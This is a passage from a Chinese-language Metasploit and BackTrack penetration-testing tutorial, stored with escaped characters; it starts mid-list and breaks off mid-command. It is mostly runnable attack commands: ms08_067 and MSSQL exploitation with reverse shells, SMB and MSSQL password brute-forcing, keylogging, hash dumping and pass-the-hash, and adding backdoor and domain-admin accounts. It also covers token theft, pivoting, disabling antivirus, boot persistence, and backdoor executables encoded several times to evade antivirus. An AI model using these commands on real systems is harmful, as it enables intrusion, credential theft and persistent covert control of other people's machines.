2\uff1a\u9898\u5916\uff1ancat\u8fd8\u53ef\u4ee5\u505a\u804a\u5929\u670d\u52a1\u5668\u5462\uff01\u5728\u670d\u52a1\u5668\u7aef\u76d1\u542c\u7136\u540e\u591a\u4e2a\u5ba2\u6237\u7aef\u76f4\u63a5\u8fde\u4e0a\u5c31\u53ef\u4ee5\u804a\u5929\u4e86\uff1a\u670d\u52a1\u5668\uff08chatserver\uff09\uff1ancatncat -l --chat   \u5176\u4ed6\u5ba2\u6237\u7aef\uff1ancat chatserver\\n\\n  3\uff1ancat\u8fd8\u53ef\u4ee5\u7528\u6765\u67e5\u770b\u5404\u79cd\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u4fe1\u606f\uff0c\u6bd4\u5982\u8bba\u575b\u91cc\u6709\u4eba\u95ee\u4e2d\u56fd\u83dc\u5200\u6709\u6728\u6709\u540e\u95e8\uff0c\u90a3\u4e48\u53ef\u4ee5\u8fd9\u6837\u67e5\u770b\u4e2d\u56fd\u83dc\u5200\u8fde\u63a5\u540e\u95e8\u65f6\u53d1\u9001\u7684\u6570\u636e\uff1a\\n\u670d\u52a1\u5668\uff08server.example.com\uff09\u4e0a\uff1a`ncat -l --keep-open 80 --output caidao.log > /dev/null`  \u7136\u540e\u4f7f\u7528\u83dc\u5200\u8fde\u63a5http://server.example.com/nc.php \u5e76\u8bf7\u6c42\u64cd\u4f5c\uff0c\u8fd9\u662f\u83dc\u5200\u53d1\u9001\u7684\u6570\u636e\u5c31\u4fdd\u5b58\u5230\u670d\u52a1\u5668\u7684caidao.log\u91cc\u9762\u4e86\u3002\u4e5f\u53ef\u4ee5\u5bfc\u51fa\u4e3ahex\u683c\u5f0f\uff0c--output\u6362\u4e3a--hex-dump\u5c31\u53ef\u4ee5\u4e86\u3002\\n\\n  4\uff1a\u5176\u5b9e\u4e0enc\u529f\u80fd\u7c7b\u4f3c\u7684\u5de5\u5177\u5728bt5\u91cc\u9762\u8fd8\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u8fd8\u6709\u4e00\u4e2asbd\uff1a\\n\\n\u76d1\u542c\uff1a`sbd -l -p 12345`\\n\\n\u8fde\u63a5\uff1a`sbd 192.168.1.111 12345`\\n\\n  5\uff1a\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u6765\u804a\u5929\uff0c\u4e0encat\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8encat\u81ea\u52a8\u5bf9\u7528\u6237\u7f16\u53f7user1\u3001user2\u3001...\uff0c\u800csbd\u53ef\u4ee5\u81ea\u5b9a\u4e49\u6635\u79f0\uff0c\u4e14\u4e0d\u9700\u8981\u4e13\u95e8\u5355\u72ec\u76d1\u542c\u4e3a\u804a\u5929\u670d\u52a1\u5668\uff1a\\n\\npc1\uff1a`sbd -l -p 12345 -P chowner`\\n\\npc2\uff1a`sbd pc1 12345 -P evil`\\n\\n  6\uff1a\u5176\u5b9enc\u4e5f\u53ef\u4ee5\u7528\u6765\u804a\u5929\u7684\uff1a\\n\\npc1\uff1a`nc -l -p 12345`\\n\\npc2: `telnet pc1 12345`\\n\\n### 2 \u4e0eNeXpose\u7ed3\u5408\u626b\u63cf\uff1a\\n\\n\u5728nexpose\u4e2d\u626b\u63cf\u76ee\u6807\u5e76\u751f\u6210xml\u683c\u5f0f\u7684\u62a5\u544a\u540e\uff0c\u5c06\u62a5\u544a\u5bfc\u5165\u5230msf\uff1a\\n\\n```\\ndb_connect postgres:toor@127.0.0.1/msf\\ndb_import /tmp/host_test.xml\\ndb_hosts \u2013c address,svvs,vulns\\ndb_vulns\\n```\\n\\n\u5728MSF\u4e2d\u8fd0\u884cnexpose\uff1a\\n\\n```\\ndb_destroy postgres:toor@127.0.0.l1/msf\\ndb_connect postgres:toor@127.0.0.1/msf\\nload nexpose\\nnexpose_connect \u2013h\\nnexpose_connect nexpose:toor@192.168.1.111 ok\\nnexpose_scan 192.168.1.195\\ndb_hosts \u2013c address\\ndb_vulns\\n```\\n\\n\uff08\u5982\u679c\u4f60\u60f3\u5728bt5\u91cc\u5b89\u88c5nexpose\u7684\u8bdd\u5efa\u8bae\u628abt5\u786c\u76d8\u7a7a\u95f4\u591a\u7559\u51e0\u5341G\uff0c\u8fd9\u73a9\u610f\u786c\u76d8\u5c0f\u4e86\u4e0d\u8ba9\u88c5\u3002\uff09\\n\\n### 3\u3001\u4e0enessus\u7ed3\u5408\u626b\u63cf\uff1a\\n\\n\u4f7f\u7528Nessus\u626b\u63cf\u5b8c\u6210\u540e\u751f\u6210.nessus\u683c\u5f0f\u7684\u62a5\u544a\uff0c\u5bfc\u5165\u5230MSF\uff1a\\n\\n```\\ndb_connect postgres:toor@127.0.0.1/msf\\ndb_import /tmp/nessus_report_Host_test.nessus\\ndb_hosts \u2013c address,svcs,vulns\\ndb_vulns\\n```\\n\\n\u5728MSF\u4e2d\u4f7f\u7528Nessus\uff1a\\n\\n```\\ndb_connect postgres:toor@127.0.0.1/msf\\nload nessus\\nnessus_connect nessus:toor@192.168.1.111:8834 ok\\nnessus_policy_list  #\u67e5\u770b\u5b58\u5728\u7684\u626b\u63cf\u89c4\u5219\\nnessus_scan_new 2 bridge_scan 192.168.1.111 #2\u8868\u793a\u89c4\u5219\u7684ID\u53f7\uff0cbridge_scan\u81ea\u5b9a\u4e49\u626b\u63cf\u540d\u79f0\\nnessus_scan_status #\u67e5\u770b\u626b\u63cf\u8fdb\u884c\u72b6\u6001\\nnessus_report_list  #\u67e5\u770b\u626b\u63cf\u7ed3\u679c\\nnessus_report_get skjla243-3b5d-*******   #\u5bfc\u5165\u62a5\u544a\\ndb_hosts \u2013c address,svcs,vulns\\n```\\n\\n### 4\u3001\u7279\u6b8a\u626b\u63cf\uff1a\\n\\nSMB\u5f31\u53e3\u4ee4:\\n\\n```\\nmsf> use auxiliary/scanner/smb/smb_login\\nset RHOSTS 192.168.1.111-222\\nset SMBUser Administrator\\nset SMBPass admin\\nrun\\n```\\n\\nVNC\u7a7a\u53e3\u4ee4\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/vnc/vnc_none_auth\\nset RHOSTS 192.168.1.111\\nrun\\n```\\n\\nOpen X11\u7a7a\u53e3\u4ee4\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/x11/open_x11\\nset RHOST 192.168.1.0/24\\nset THREADS 50\\nrun\\n```\\n\\n\u5f53\u626b\u63cf\u5230\u6b64\u6f0f\u6d1e\u7684\u4e3b\u673a\u540e\u53ef\u4ee5\u4f7f\u7528xspy\u5de5\u5177\u6765\u76d1\u89c6\u5bf9\u65b9\u7684\u952e\u76d8\u8f93\u5165\uff1a\\n\\n```\\ncd /pentest/sniffers/xspy/\\n./xspy \u2013display 192.168.1.125:0 \u2013delay 100\\n```\\n\\n### 5\u3001\u4f7f\u7528Autopwn\u5904\u7406\u626b\u63cf\u7ed3\u679c\uff1a\\n\\nautopwn\u9009\u9879\uff1ae\u6267\u884cattack   t\u67e5\u770b\u5339\u914d\u6a21\u5757   r\u4f7f\u7528reverse shell\u4f5c\u4e3apayload   x\u57fa\u4e8e\u6f0f\u6d1e\u7b5b\u9009\u6a21\u5757  p\u57fa\u4e8e\u7aef\u53e3\u7b5b\u9009\u6a21\u5757\\n\\n```\\ndb_connect postgres:toor@127.0.0.1/msf\\ndb_import /root/nessus.nbe\\ndb_autopwn \u2013e \u2013t \u2013r \u2013x \u2013p\\n```\\n\\n* -e \u9488\u5bf9\u7b26\u5408\u6761\u4ef6\u7684\u76ee\u6807\u52a0\u8f7d\u6240\u6709exploit -t\u663e\u793a\u6240\u6709\u5339\u914d\u7684exploit -r\u4f7f\u7528\u53cd\u5f39shell\\n* -x \u57fa\u4e8e\u6f0f\u6d1e\u7b5b\u9009\u6a21\u5757 -p\u57fa\u4e8e\u7aef\u53e3\u7b5b\u9009\u6a21\u5757\\n\\n## \u4e94\uff0e\u57fa\u7840\u6ea2\u51fa\u547d\u4ee4\\n\\n### 1\u3001\u57fa\u672c\u547d\u4ee4\uff1a\\n\\n\u67e5\u770b\u53ef\u7528\u6ea2\u51fa\u6a21\u5757`show exploits`\\n\u67e5\u770b\u8f85\u52a9\u6a21\u5757`show auxiliary`  \u5305\u62ec\u626b\u63cf\u5668\uff0c\u62d2\u7edd\u670d\u52a1\u6a21\u5757\uff0cfuzzer\u5de5\u5177\u6216\u5176\u4ed6\u3002\\n\u67e5\u770b\u53ef\u7528\u9009\u9879`show options`\\n\\n\u52a0\u8f7d\u6a21\u5757\u540e\u9000\u51fa\u6b64\u6a21\u5757 back\\n\\n\u4f8b\u5b50\uff1a\\n```\\nmsf> use windows/smb/ms08_067_netapi\\nback\\n```\\n\\n\u641c\u7d22\u6a21\u5757 search\\n\\n\u4f8b\u5b50\uff1a `searh mssql search ms08_067`\\n\\n\u67e5\u770b\u5f53\u524d\u6a21\u5757\u53ef\u7528\u7684payload\uff1a `show payloads`\\n\\n\u4f8b\u5b50\uff1a\\n```\\nuse windows/smb/ms08_067_netapi\\nshow payloads\\nset payload windows/shell/reverse_tcp\\nshow options\\n```\\n\\n\u67e5\u770b\u53ef\u9009\u7684\u76ee\u6807\u7c7b\u578b`show targets`\\n\u67e5\u770b\u66f4\u591a\u4fe1\u606f`info`\\n\u8bbe\u7f6e\u4e00\u4e2a\u9009\u9879\u6216\u53d6\u6d88\u8bbe\u7f6e `set/unset`\\n\u8bbe\u7f6e\u6216\u53d6\u6d88\u5168\u5c40\u9009\u9879 `setg/unsetg`  \u4f8b\u5982\u8bbe\u7f6eLHOST\u5c31\u53ef\u4ee5\u7528setg\uff0c\u907f\u514d\u540e\u9762\u91cd\u590d\u8bbe\u7f6e\\n\u4fdd\u5b58\u5168\u5c40\u9009\u9879\u7684\u8bbe\u7f6e `save`   \u5f53\u4e0b\u6b21\u542f\u52a8\u4ecd\u7136\u751f\u6548\\n\u67e5\u770b\u5efa\u7acb\u7684session  `sessions \u2013l`\\n\\n\u6fc0\u6d3bsession   `sessions \u2013i  num`    #num\u4e3asession\u7f16\u53f7\\n\\n\\n### 2\u3001\u66b4\u529b\u7aef\u53e3\u63a2\u6d4b\uff1a\\n\\n\u5f53\u4e3b\u673a\u7aef\u53e3\u5bf9\u5916\u5f00\u653e\u4f46\u662f\u666e\u901a\u63a2\u6d4b\u65b9\u6cd5\u65e0\u6cd5\u63a2\u6d4b\u5230\u65f6\uff0c\u7528\u6b64\u6a21\u5757\uff0cmsf\u5c06\u5bf9\u76ee\u6807\u7684\u6240\u6709\u7aef\u53e3\u8fdb\u884c\u5c1d\u8bd5\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5f00\u653e\u7aef\u53e3\u5e76\u4e0e\u6d4b\u8bd5\u8005\u5efa\u7acb\u8fde\u63a5\u3002\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nuse exploit/windows/smb/ms08_067_netapi\\nset LHOST 192.168.1.111\\nset RHOST 192.168.1.122\\nset TARGET 39 #Windows XP SP3 Chinese - Simplified (NX)\\nsearch ports   #\u641c\u7d22\u4e0eports\u76f8\u5173\u6a21\u5757\\nset PAYLOAD windows/meterpreter/reverse_tcp_allports\\nexploit \u2013j   #\u4f5c\u4e3a\u540e\u53f0\u4efb\u52a1\u8fd0\u884c\\nsessions \u2013l \u2013v\\nsesssions \u2013i 1\\n```\\n\\n### 3\u3001MSF\u811a\u672c\u6587\u4ef6\uff1a\\n\\n\u4e3a\u4e86\u7f29\u77ed\u6d4b\u8bd5\u65f6\u95f4\u53ef\u4ee5\u5c06msf\u547d\u4ee4\u5199\u5165\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u5728msf\u4e2d\u52a0\u8f7d\u5b83\u3002\\n\\n\u52a0\u8f7d\u65b9\u5f0f\uff1amsfconsole\u7684resource\u547d\u4ee4\u6216\u8005msfconsole\u52a0\u4e0a-r\u9009\u9879\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\necho \u2018version\u2019 > resource.rc\\necho \u2018load sounds\u2019 >> resource.rc\\nmsfconsole \u2013r resource.rc\\n```\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\necho \'use exploit/windows/smb/ms08_067_netapi\' > autoexp.rc\\necho \'set RHOST 192.168.1.133\' >> autoexp.rc\\necho \'set PAYLOAD windows/meterpreter/reverse_tcp\' >> autoexp.rc\\necho \'set LHOST 192.168.1.111\' >> autoexp.rc\\necho \'exploit\' >> autoexp.rc\\nmsfconsole\\nmsf> resource autoexp.rc\\n```\\n\\n## \u516d\uff0eMETERPRETER\\n\\n### 1\u3001\u4f7f\u7528meterpreter\\n\\n\u5f53\u5bf9\u76ee\u6807\u7cfb\u7edf\u8fdb\u884c\u6ea2\u51fa\u65f6\uff0c\u4f7f\u7528meterpreter\u4f5c\u4e3apayload\uff0c\u7ed9\u6d4b\u8bd5\u8005\u8fd4\u56de\u4e00\u4e2ashell\uff0c\u53ef\u7528\u4e8e\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u66f4\u591a\u7684\u64cd\u4f5c\u3002\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmsf> nmap \u2013sT \u2013A \u2013P0 192.168.1.130 #\u63a2\u6d4b\u5f00\u653e\u670d\u52a1\\n#\u5047\u5982\u5df2\u7ecf\u63a2\u6d4b\u52301433\uff08TCP\uff09\u548c1434(UDP)\u7aef\u53e3\uff08mssql\uff09\uff0c\\nmsf> nmap \u2013sU 192.168.1.130 \u2013P 1434   #\u786e\u8ba4\u7aef\u53e3\u5f00\u653e\\nmsf> use auxiliary/scanner/mssql/mssql_ping\\nshow options\\nset RHOSTS 192.168.1.1/24\\nset THREADS 20\\nexploit\\n```\\n\\n\u81f3\u6b64\u53ef\u83b7\u53d6\u670d\u52a1\u5668\u540d\u79f0\uff0c\u7248\u672c\u53f7\u7b49\u4fe1\u606f\u3002\\n\\n```\\nmsf> use auxiliary/scanner/mssql/mssql_login\\nshow options\\nset PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt\\nset RHOSTS 192.168.1.130\\nset THREADS 10\\nset verbose false\\nexploit\\n```\\n\\n\u66b4\u529b\u731c\u89e3\u767b\u9646\u5bc6\u7801\u3002\u63a5\u4e0b\u6765\u4f7f\u7528mssql\u81ea\u5e26\u7684xp_cmdshell\u529f\u80fd\u6dfb\u52a0\u8d26\u6237\uff1a\\n\\n```\\nmsf> use exploit/windows/mssql/mssql_payload\\nshow options\\nset payload windows/meterpreter/reverse_tcp\\nset LHOST 192.168.1.111\\nset LPORT 433\\nset RHOST 192.168.1.130\\nset PASSWORD password130\\nexploit\\n```\\n\\n\u5f53\u83b7\u53d6\u5230\u4e00\u4e2ameterpreter shell \u540e\u53ef\u4ee5\u6267\u884c\u66f4\u591a\u7684\u64cd\u4f5c\uff1a\\n\\n\u83b7\u53d6\u5c4f\u5e55\u622a\u56fe\uff1a`screenshot`\\n\\n\u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f\uff1a`sysinfo`\\n\\n\u83b7\u53d6\u952e\u76d8\u8bb0\u5f55\uff1a\\n```\\nmeterpreter> ps  #\u67e5\u770b\u76ee\u6807\u673a\u5668\u8fdb\u7a0b\uff0c\u5047\u8bbe\u53d1\u73b0explorer.exe\u7684\u8fdb\u7a0b\u53f7\u4e3a1668:\\nmeterpreter> migrate 1668  #\u63d2\u5165\u8be5\u8fdb\u7a0b\\nmeterpreter> run post/windows/capture/keylog_recorder  #\u8fd0\u884c\u952e\u76d8\u8bb0\u5f55\u6a21\u5757\uff0c\u5c06\u51fb\u952e\u8bb0\u5f55\u4fdd\u5b58\u5230\u672c\u5730txt\\ncat /root/.msf3/loot/*****.txt  #\u67e5\u770b\u7ed3\u679c\\n```\\n\\n\u83b7\u53d6\u7cfb\u7edf\u8d26\u53f7\u5bc6\u7801\uff1a\\n\\n```\\nmeterpreter> use priv\\nmeterpreter> run post/windows/gather/hashdump\\n```\\n\\n\u5f53\u83b7\u53d6\u5230\u5bc6\u7801\u7684hash\u4e4b\u540e\u65e0\u6cd5\u7834\u89e3\u51fa\u660e\u6587\u5bc6\u7801\u4e14\u65e0\u6cd5\u76f4\u63a5\u4f7f\u7528hash\u767b\u9646\uff0c\u9700\u8981\u4f7f\u7528pass-the-hash\u6280\u672f\uff1a\\n\\n```\\nmsf> use windows/smb/psexec\\nset PAYLOAD windows/meterpreter/reverse_tcp\\nset LHOST 192.168.1.111\\nset LPORT 443\\nset RHOST 192.168.1.130\\nset SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29\\nexploit\\n```\\n\\n\u83b7\u53d6\u5230\u7cfb\u7edf\u6743\u9650\u540e\u6211\u4eec\u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u666e\u901a\u8d26\u53f7\uff0c\u7136\u540e\u4f7f\u7528\u6b64\u8d26\u53f7\u6267\u884c\u6211\u4eec\u7684\u540e\u95e8\uff1a\\n\\n\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\uff1a`net uaer hacker pass /add`\\n\\n\u672c\u5730\u751f\u6210\u4e00\u4e2a\u540e\u95e8\u7a0b\u5e8f\uff1a\\n\\n```\\nmsfpayload windows/meterpreter/reverse_tcp\\nLHOST=192.168.1.111 LPORT=443 X >payload.exe\\n```\\n\\n\u5c06payload.exe\u62f7\u8d1d\u5230\u76ee\u6807\u673a\u5668\u7136\u540e\u4f7f\u7528\u65b0\u5efa\u7acb\u7684\u8d26\u53f7\u6267\u884c,\u672c\u5730\u6267\u884c\u7aef\u53e3\u76d1\u542c\uff0c\u7b49\u5f85\u6765\u81ea\u76ee\u6807\u673a\u5668\u8fde\u63a5\uff1a\\n\\n```\\nmsfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp\\nLHOST=192.168.1.111 LPORT=443\\nuse priv\\ngetsystem\\ngetuid\\n```\\n\\n\u81f3\u6b64\u53d6\u5f97SYSTEM\u6743\u9650\\n\\n\\n### 2\u3001\u4ee4\u724c\u6a21\u62df\uff1a\\n\u5f53\u6709\u57df\u63a7\u8d26\u6237\u767b\u9646\u81f3\u670d\u52a1\u5668\u65f6\u53ef\u4f7f\u7528\u4ee4\u724c\u6a21\u62df\u8fdb\u884c\u6e17\u900f\u53d6\u5f97\u57df\u63a7\u6743\u9650\uff0c\u4e4b\u540e\u767b\u9646\u5176\u4ed6\u673a\u5668\u65f6\u4e0d\u9700\u8981\u767b\u9646\u5bc6\u7801\u3002\\n\\n```\\nmeterpreter> ps  # \u67e5\u770b\u76ee\u6807\u673a\u5668\u8fdb\u7a0b\uff0c\u627e\u51fa\u57df\u63a7\u8d26\u6237\u8fd0\u884c\u7684\u8fdb\u7a0bID\uff0c\u5047\u5982\u53d1\u73b0PID\u4e3a380\\nmeterpreter> steal_token 380\\n#\u6709\u65f6ps\u547d\u4ee4\u5217\u51fa\u7684\u8fdb\u7a0b\u4e2d\u53ef\u80fd\u4e0d\u5b58\u5728\u57df\u63a7\u8d26\u6237\u7684\u8fdb\u7a0b\uff0c\u6b64\u65f6\u4f7f\u7528incognito\u6a21\u5757\u67e5\u770b\u53ef\u7528token\uff1a\\nmeterpreter> use incognito\\nmeterpreter> list_tokens \u2013u  #\u5217\u51fa\u53ef\u7528token\uff0c\u5047\u5982\u627e\u5230\u57df\u63a7token\\nmeterpreter> impersonate_token SNEAKS.IN\\\\\\\\ihazdomainadmin\\nmeterpreter> add_user hacker password \u2013h 192.168.1.50 #\u5728\u57df\u63a7\u4e3b\u673a\u4e0a\u6dfb\u52a0\u8d26\u6237\\nmeterpreter> add_group_user \u201cDomain Admins\u201d hacker \u2013h 192.168.1.50  #\u5c06\u8d26\u6237\u6dfb\u52a0\u81f3\u57df\u7ba1\u7406\u5458\u7ec4\\n```\\n\\n### 3\u3001\u5185\u7f51\u6e17\u900f\uff1a\\n\u5f53\u53d6\u5f97\u540c\u7f51\u6bb5\u5185\u4e00\u53f0\u4e3b\u673a\u7684\u6743\u9650\u540e\u53ef\u4ee5\u8fdb\u4e00\u6b65\u6e17\u900f\u7f51\u5185\u5176\u4ed6\u4e3b\u673a\uff1a\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmeterpreter> run get_local_subnets  #\u67e5\u770b\u7f51\u6bb5/\u5b50\u7f51\\nLocal subnet: 192.168.33.0/255.255.255.0\\nmeterpreter> background  #\u8f6c\u5165\u540e\u53f0\u8fd0\u884c\\nmsf> route add 192.168.33.0 255.255.255.0 1  #\u672c\u5730\u6dfb\u52a0\u8def\u7531\u4fe1\u606f\\nmsf> route print #\u67e5\u770b\u6dfb\u52a0\u7684\u4fe1\u606f\\nmsf> use linux/samba/lsa_transnames_heap   #\u51c6\u5907\u5411\u5185\u7f51\u76ee\u6807\u4e3b\u673a\u8fdb\u653b\\nset payload linux/x86/shell/reverse_tcp\\nset LHOST 10.10.1.129 #\u6b64\u5904\u4e3aattacking\u4e3b\u673a\u7684\u5916\u7f51IP \\nset LPORT 8080\\nset RHOST 192.168.33.132 #\u5185\u7f51\u76ee\u6807\u4e3b\u673a\\nexploit\\n```\\n\\n\u4e5f\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5f0f\u6dfb\u52a0\u8def\u7531\u6a21\u5757\uff1a\\n\\n```\\nmsf> load auto_add_route\\nmsf> exploit\\n```\\n\\n### 4\u3001Meterpreter\u811a\u672c\uff1a\\n\u4f7f\u7528run scriptname \u65b9\u5f0f\u6267\u884c\\n\\nvnc\u811a\u672c,\u83b7\u53d6\u8fdc\u7a0b\u673a\u5668vnc\u754c\u9762\u63a7\u5236\\n\\n```\\nmeterpreter> run vnc\\nmeterpreter> run screen_unlock\\n```\\n\\n\u8fdb\u7a0b\u8fc1\u79fb\\n\\n\u5f53\u653b\u51fb\u6210\u529f\u540e\u5c06\u8fde\u63a5\u8fdb\u7a0b\u4ece\u4e0d\u7a33\u5b9a\u8fdb\u7a0b\uff08\u5982\u4f7f\u7528\u6d4f\u89c8\u5668\u6ea2\u51fa\u6f0f\u6d1eexp\u8fdb\u884c\u653b\u51fb\u65f6\u6d4f\u89c8\u5668\u53ef\u80fd\u4f1a\u88ab\u76ee\u6807\u5173\u95ed\uff09\u8fc1\u79fb\u81f3\u7a33\u5b9a\u8fdb\u7a0b(explorer.exe)\uff0c\u4fdd\u6301\u53ef\u8fde\u63a5\u3002\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmeterpreter> run post/windows/manage/migrate\\n```\\n\\n\uff08\u572864\u4f4dwin7\u4e2dmigrate\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u6267\u884c\u540e\u95e8\u624d\u80fd\u6210\u529f\uff0c\u800cmigrate\u524d\u540e\u83b7\u53d6\u7684\u6743\u9650\u662f\u6709\u5dee\u5f02\u7684\u3002\uff09\\n\\n\u5173\u95ed\u6740\u6bd2\u8f6f\u4ef6\\n\\n```\\nmeterpreter> run killav   \uff08\u8fd9\u4e2a\u811a\u672c\u8981\u5c0f\u5fc3\u4f7f\u7528\uff0c\u53ef\u80fd\u5bfc\u81f4\u76ee\u6807\u673a\u5668\u84dd\u5c4f\u6b7b\u673a\u3002\uff09\\n```\\n\\n\u83b7\u53d6\u7cfb\u7edf\u5bc6\u7801hash\\n\\n```\\nmeterpreter> run hashdump\\n```\\n\\n\uff0864\u4f4dwin7\u4e0b\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u6267\u884c\u540e\u95e8\u4e14\u5148getsystem\uff0c\u7136\u540e\u4f7f\u7528\\n\\n```\\nrun  post/windows/gather/hashdump\u6765dump hash\u6210\u529f\u7387\u66f4\u9ad8\u3002\\n```\\n\u800c\u4e14\u5982\u679c\u8981\u4f7f\u7528shell\u6dfb\u52a0\u7cfb\u7edf\u8d26\u6237\u7684\u8bddwin7\u4e0b\u5f97\u5148\uff1a\\n\\n```\\nrun post/windows/escalate/bypassuac  \uff0c\u4e0d\u7136\u53ef\u80fd\u4e0d\u4f1a\u6210\u529f\u3002\uff09\\n```\\n\\n\u83b7\u53d6\u7cfb\u7edf\u6d41\u91cf\u6570\u636e\\n\\n```\\nmeterpreter> run packtrecorder \u2013i 1\\n```\\n\\n\\n\u76f4\u6363\u9ec4\u9f99\\n\\n\u53ef\u4ee5\u5e72\u5f88\u591a\u4e8b\u60c5\uff1a\u83b7\u53d6\u5bc6\u7801\uff0c\u4e0b\u8f7d\u6ce8\u518c\u8868\uff0c\u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f\u7b49\\n\\n```\\nmeterpreter> run scraper\\n```\\n\\n\u6301\u4e45\u4fdd\u6301\\n\\n\u5f53\u76ee\u6807\u673a\u5668\u91cd\u542f\u4e4b\u540e\u4ecd\u7136\u53ef\u4ee5\u63a7\u5236\\n\\n```\\nmeterpreter> run persistence \u2013X \u2013i 50 \u2013p 443 \u2013r 192.168.1.111\\n```\\n\\n-X \u5f00\u673a\u542f\u52a8  -i\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4 \u2013p\u7aef\u53e3 \u2013rIP\\n\\n\u4e0b\u6b21\u8fde\u63a5\u65f6\uff1a\\n\\n```\\nmsf> use multi/handler\\nset payload windows/meterpreter/reverse_tcp\\nset LPOST 443\\nset LHOST 192.168.1.111\\nexploit\\n```\\n\\n(\u4f1a\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u548c\u6ce8\u518c\u8868\u4ee5\u968f\u673a\u6587\u4ef6\u540d\u5199\u5165\u6587\u4ef6\u7b49\u4fe1\u606f\uff0c\u5982\uff1a\\n\\nC:\\\\Users\\\\YourtUserName\\\\AppData\\\\Local\\\\Temp\\\\MXIxVNCy.vbs\\n\\nC:\\\\Users\\\\YourtUserName\\\\AppData\\\\Local\\\\Temp\\\\radF871B.tmp\\\\svchost.exe\\n\\nHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\DjMzwzCDaoIcgNP)\\n\\n\\nPOST\u6574\u5408\u6a21\u5757\\n\\n\u53ef\u5b9e\u73b0\u540c\u65f6\u591a\u4e2asession\u64cd\u4f5c\\n\\n\u4f8b\u5b50\uff1a\u83b7\u53d6hash\\n\\n```\\nmeterpreter> run post/windows/gather/hashdump\\n```\\n\\n\u5176\u4ed6\u8fd8\u6709\u5f88\u591a\uff0c\u4f7f\u7528TAB\u952e\u8865\u5168\u770b\u4e0b\u5c31\u77e5\u9053\\n\\n### 5\u3001\u5347\u7ea7command shell\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmsfconsole\\nmsf> search ms08_067\\nmsf> use windows/smb/ms08_067_netapi\\nset PAYLOAD windows/shell/reverse_tcp\\nset TARGET 3\\nsetg LHOST 192.168.1.111\\nsetg LPORT 8080\\nexploit \u2013z  #\u540e\u53f0\u8fd0\u884c\uff0c\u5982\u679c\u6b64\u5904\u672a\u4f7f\u7528-z\u53c2\u6570\uff0c\u540e\u9762\u53ef\u4ee5\u6309CTRL-Z\u8f6c\u5230\u540e\u53f0\\nsessions \u2013u 1  #\u5347\u7ea7shell\uff0c\u5fc5\u987b\u524d\u9762\u4f7f\u7528setg\u8bbe\u5b9a\\nsessions \u2013i 2\\n```\\n\\n### 6\u3001\u4f7f\u7528Railgun\u64cd\u4f5cwindows APIs \\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmeterpreter> irb\\n>>client.railgun.user32.MessageBoxA(o,\u201dhello\u201d,\u201dworld\u201d,\u201dMB_OK\u201d)\\n```\\n\\n\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4f1a\u5f39\u51fa\u4e00\u4e2a\u6807\u9898\u680f\u4e3aworld\u548c\u5185\u5bb9\u4e3ahello\u7684\u7a97\u53e3\\n\\n\\n## \u4e03\uff0e\u907f\u5f00\u6740\u8f6f\\n\\n### 1\u3001\u4f7f\u7528msfpayload\u521b\u5efa\u53ef\u6267\u884c\u540e\u95e8\uff1a\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmsfpayload windows/shell_reverse_tcp 0  #\u67e5\u770b\u9009\u9879\\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X > /var/www/payload1.exe\\n```\\n\\n\u7136\u540e\u672c\u673a\u76d1\u542c\u7aef\u53e3\\n\\n```\\nmsf> use exploit/multi/handler\\nshow options\\nset PAYLOAD windows/shell_reverse_tcp\\nset LHOST 192.168.1.111\\nset LPORT 31337\\nexploit\\n```\\n\\n### 2\u3001\u8fc7\u6740\u8f6f---\u4f7f\u7528msfencode\u7f16\u7801\u540e\u95e8\uff1a\\n\\nmsfencode \u2013l  #\u5217\u51fa\u53ef\u7528\u7f16\u7801\u5668\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode \u2013e x86/shikata_ga_nai \u2013t exe > /var/www/payload2.exe\\n```\\n\\n\u4f7f\u7528 R\u53c2\u6570\u4f5c\u4e3araw\u8f93\u51fa\u81f3\u7ba1\u9053\uff0c\u518d\u7ecf\u8fc7msfencode\u5904\u7406\uff0c\u6700\u540e\u5bfc\u51fa\u3002\\n\\n\\n### 3\u3001\u591a\u6b21\u7f16\u7801\uff1a\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \\\\\\n    msfencode \u2013e x86/shikata_ga_nai \u2013c 5 \u2013t raw | \\\\\\n    msfencode \u2013e x86/alpha_upper \u2013c 2 \u2013t raw | \\\\\\n    msfencode \u2013e x86/shikata_ga_nai \u2013c 5 \u2013t raw | \\\\\\n    msfencode \u2013e x86/countdown \u2013c 5 \u2013t exe \u2013o 